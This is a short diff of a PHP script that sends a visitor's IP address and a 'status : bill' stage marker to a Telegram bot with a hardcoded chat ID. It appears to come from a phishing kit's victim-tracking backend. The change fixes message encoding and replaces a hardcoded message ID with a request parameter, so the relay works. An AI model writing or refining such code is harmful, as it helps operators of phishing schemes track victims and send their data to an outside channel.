@@ -6,7 +6,7 @@ if(isset($_GET['messageId'])){
 $chatID = "1064643518";
 	$messageId=$_GET['messageId'];
 	$ipzebi=$_GET['ipzebi'];
-	$message = urlencode("IP: $ipzebi , status : bill");
+	$message ="IP: $ipzebi , status : bill";
 
 
 
@@ -18,7 +18,7 @@ curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$botToken."/editMes
 curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
     'chat_id' => $chatID,
-    'message_id' => 40,
+    'message_id' => $messageId,
     'text' => $message
 ]));
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
